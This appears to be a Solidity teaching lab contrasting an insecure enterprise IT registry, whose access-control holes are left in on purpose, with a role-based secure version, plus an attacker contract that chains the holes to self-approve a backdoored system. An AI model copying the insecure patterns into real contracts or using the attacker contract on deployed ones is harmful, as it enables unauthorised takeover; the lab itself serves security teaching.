// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * SMART CONTRACT LAB:
 *   "Enterprise Information Technology" (E-IT)
 *
 * We model an Enterprise IT Registry:
 *   - Systems are registered (apps, DBs, services).
 *   - IT admins manage systems and configs.
 *   - Security officers approve and mark compliance.
 *
 * INSECURE VERSION:
 *   - Anyone can become IT admin.
 *   - Anyone can register or modify any system.
 *   - Anyone can approve and mark "compliant".
 *   - Plaintext configs on-chain.
 *
 * SECURE VERSION:
 *   - Owner assigns IT admins & security officers.
 *   - Only IT admins can register systems.
 *   - Only security officers can approve / mark compliant.
 *   - Only hashes of configs are stored.
 */

/*//////////////////////////////////////////////////////////////
//                 INSECURE ENTERPRISE IT REGISTRY
//////////////////////////////////////////////////////////////*/

contract EnterpriseITInsecure {
    struct System {
        address owner;       // who registered/owns it in the org
        string name;         // e.g. "Billing-API"
        string env;          // e.g. "prod", "dev"
        string config;       // full plaintext config (bad)
        bool approved;       // "change approved" flag
        address approvedBy;  // whoever approved
        bool compliant;      // some made-up compliance flag
        bool exists;
    }

    // systemId => System
    mapping(uint256 => System) public systems;

    // IT admins (but mapping is fully attacker-controlled)
    mapping(address => bool) public isITAdmin;

    uint256 public nextSystemId;

    event ITAdminSet(address indexed who, bool status);
    event SystemRegistered(uint256 indexed id, address indexed owner, string name, string env);
    event SystemConfigUpdated(uint256 indexed id, string newConfig);
    event SystemApproved(uint256 indexed id, address indexed approver);
    event SystemComplianceSet(uint256 indexed id, bool compliant);

    /**
     * ⚠ VULN #1:
     * Anyone can add or remove IT admins (including themselves).
     */
    function setITAdmin(address who, bool status) external {
        isITAdmin[who] = status;
        emit ITAdminSet(who, status);
    }

    /**
     * ⚠ VULN #2:
     * Anyone can register a system with any name/env/config.
     */
    function registerSystem(
        string calldata name,
        string calldata env,
        string calldata config
    ) external returns (uint256) {
        uint256 id = nextSystemId++;

        systems[id] = System({
            owner: msg.sender,
            name: name,
            env: env,
            config: config,
            approved: false,
            approvedBy: address(0),
            compliant: false,
            exists: true
        });

        emit SystemRegistered(id, msg.sender, name, env);
        return id;
    }

    /**
     * ⚠ VULN #3:
     * Anyone can change config for any system.
     */
    function updateConfig(uint256 id, string calldata newConfig) external {
        System storage s = systems[id];
        require(s.exists, "NO_SYSTEM");

        s.config = newConfig;
        emit SystemConfigUpdated(id, newConfig);
    }

    /**
     * ⚠ VULN #4:
     * Anyone can approve any system change.
     */
    function approveSystem(uint256 id) external {
        System storage s = systems[id];
        require(s.exists, "NO_SYSTEM");

        s.approved = true;
        s.approvedBy = msg.sender;

        emit SystemApproved(id, msg.sender);
    }

    /**
     * ⚠ VULN #5:
     * Anyone can mark any system as compliant or non-compliant.
     */
    function setCompliance(uint256 id, bool compliant) external {
        System storage s = systems[id];
        require(s.exists, "NO_SYSTEM");

        s.compliant = compliant;
        emit SystemComplianceSet(id, compliant);
    }

    /**
     * Fake trust check:
     *  - system exists
     *  - approved == true
     *  - compliant == true
     *  - approvedBy is "IT admin" (but mapping is attacker-controlled).
     */
    function isTrustedSystem(uint256 id) external view returns (bool) {
        System storage s = systems[id];
        if (!s.exists) return false;
        if (!s.approved) return false;
        if (!s.compliant) return false;
        if (!isITAdmin[s.approvedBy]) return false;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
//                           OWNABLE
//////////////////////////////////////////////////////////////*/

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);

    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "ZERO_ADDRESS");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

/*//////////////////////////////////////////////////////////////
//                 SECURE ENTERPRISE IT REGISTRY
//////////////////////////////////////////////////////////////*/

contract EnterpriseITSecure is Ownable {
    struct System {
        uint256 id;
        address owner;       // IT admin who owns this system record
        bytes32 nameId;      // keccak256("Billing-API")
        bytes32 envId;       // keccak256("prod"), keccak256("dev")
        bytes32 configHash;  // hash of off-chain configuration blob
        bool approved;       // change approved by security officer
        bool compliant;      // compliance result set by security officer
        address approvedBy;  // security officer address
        bool exists;
    }

    // systemId => System
    mapping(uint256 => System) public systems;

    // roles
    mapping(address => bool) public isITAdmin;         // can register systems
    mapping(address => bool) public isSecurityOfficer; // can approve/mark compliant

    uint256 public nextSystemId;

    event ITAdminSet(address indexed who, bool status);
    event SecurityOfficerSet(address indexed who, bool status);
    event SystemRegistered(
        uint256 indexed id,
        address indexed owner,
        bytes32 nameId,
        bytes32 envId,
        bytes32 configHash
    );
    event SystemApproved(uint256 indexed id, address indexed officer);
    event SystemComplianceSet(uint256 indexed id, bool compliant);

    modifier onlyITAdmin() {
        require(isITAdmin[msg.sender], "NOT_IT_ADMIN");
        _;
    }

    modifier onlySecurityOfficer() {
        require(isSecurityOfficer[msg.sender], "NOT_SECURITY_OFFICER");
        _;
    }

    /**
     * Owner assigns IT admins.
     */
    function setITAdmin(address who, bool status) external onlyOwner {
        require(who != address(0), "ZERO_ADDRESS");
        isITAdmin[who] = status;
        emit ITAdminSet(who, status);
    }

    /**
     * Owner assigns security officers.
     */
    function setSecurityOfficer(address who, bool status) external onlyOwner {
        require(who != address(0), "ZERO_ADDRESS");
        isSecurityOfficer[who] = status;
        emit SecurityOfficerSet(who, status);
    }

    /**
     * IT admin registers a system with hashed metadata and config.
     *
     * nameId      = keccak256(abi.encodePacked("Billing-API"))
     * envId       = keccak256(abi.encodePacked("prod"))
     * configHash  = keccak256(abi.encodePacked(full_yaml_or_json_config))
     */
    function registerSystem(
        bytes32 nameId,
        bytes32 envId,
        bytes32 configHash
    ) external onlyITAdmin returns (uint256) {
        require(nameId != bytes32(0), "BAD_NAME");
        require(envId != bytes32(0), "BAD_ENV");
        require(configHash != bytes32(0), "BAD_CONFIG_HASH");

        uint256 id = nextSystemId++;

        systems[id] = System({
            id: id,
            owner: msg.sender,
            nameId: nameId,
            envId: envId,
            configHash: configHash,
            approved: false,
            compliant: false,
            approvedBy: address(0),
            exists: true
        });

        emit SystemRegistered(id, msg.sender, nameId, envId, configHash);
        return id;
    }

    /**
     * IT admin can update the config hash (e.g., new release),
     * but it resets approval & compliance state.
     */
    function updateConfigHash(uint256 id, bytes32 newConfigHash) external onlyITAdmin {
        System storage s = systems[id];
        require(s.exists, "NO_SYSTEM");
        require(s.owner == msg.sender, "NOT_OWNER_OF_SYSTEM");
        require(newConfigHash != bytes32(0), "BAD_CONFIG_HASH");

        s.configHash = newConfigHash;
        // reset approval/compliance on change
        s.approved = false;
        s.compliant = false;
        s.approvedBy = address(0);
    }

    /**
     * Security officer approves a system.
     */
    function approveSystem(uint256 id) external onlySecurityOfficer {
        System storage s = systems[id];
        require(s.exists, "NO_SYSTEM");

        s.approved = true;
        s.approvedBy = msg.sender;

        emit SystemApproved(id, msg.sender);
    }

    /**
     * Security officer sets compliance flag.
     */
    function setCompliance(uint256 id, bool compliant) external onlySecurityOfficer {
        System storage s = systems[id];
        require(s.exists, "NO_SYSTEM");

        s.compliant = compliant;
        emit SystemComplianceSet(id, compliant);
    }

    /**
     * Trusted system:
     *  - exists
     *  - owner is IT admin
     *  - approved == true
     *  - compliant == true
     *  - approvedBy is current security officer
     */
    function isTrustedSystem(uint256 id) external view returns (bool) {
        System storage s = systems[id];
        if (!s.exists) return false;
        if (!isITAdmin[s.owner]) return false;
        if (!s.approved) return false;
        if (!s.compliant) return false;
        if (!isSecurityOfficer[s.approvedBy]) return false;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
//                      ATTACKER CONTRACT
//////////////////////////////////////////////////////////////*/

contract EnterpriseITAttacker {
    EnterpriseITInsecure public target;

    constructor(address _target) {
        target = EnterpriseITInsecure(_target);
    }

    /**
     * Step 1: become IT admin in the insecure registry.
     */
    function becomeITAdmin() public {
        target.setITAdmin(address(this), true);
    }

    /**
     * Step 2: register a malicious/backdoored system.
     */
    function registerBackdoorSystem(
        string calldata name,
        string calldata env,
        string calldata config
    ) public returns (uint256) {
        return target.registerSystem(name, env, config);
    }

    /**
     * Step 3: rewrite config to something even worse.
     */
    function tamperConfig(uint256 id, string calldata newConfig) public {
        target.updateConfig(id, newConfig);
    }

    /**
     * Step 4: self-approve & mark compliant.
     */
    function selfApproveAndComply(uint256 id) public {
        target.approveSystem(id);
        target.setCompliance(id, true);
    }

    /**
     * One-click full exploit:
     *  - become IT admin
     *  - register backdoor system
     *  - (optionally) tamper config
     *  - approve & mark compliant
     */
    function fullAttack(
        string calldata name,
        string calldata env,
        string calldata config
    ) external returns (uint256) {
        becomeITAdmin();
        uint256 id = registerBackdoorSystem(name, env, config);
        selfApproveAndComply(id);
        return id;
    }
}
